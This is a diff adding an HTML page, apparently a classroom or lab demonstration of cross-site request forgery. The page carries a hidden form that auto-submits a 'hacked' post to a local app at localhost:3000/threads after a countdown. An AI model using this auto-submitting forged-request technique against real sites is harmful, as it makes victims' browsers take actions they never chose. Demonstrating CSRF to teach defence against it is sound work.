@@ -1,0 +1,24 @@
+<html>
+	<body>
+		<h1>evil-attacker.com</h1>
+		<h3>CSRF attack in <span id="countdown">5</span>...
+		</h3>
+		<form action="http://localhost:3000/threads" method="POST">
+			<input type="hidden" name="title" value="hacked"><br />
+			<input type="hidden" name="description" value="you have been victim of a csrf attack"/>
+		</form>
+		<script>
+			var $countdown = document.getElementById("countdown");
+			var countdown = 4;
+
+			var timer = setInterval(function () {
+				if (countdown == 0) {
+					document.forms[0].submit();
+					clearInterval(timer);
+				}
+				$countdown.innerText = countdown;
+				countdown--;
+			}, 1000)
+		</script>
+	</body>
+</html>
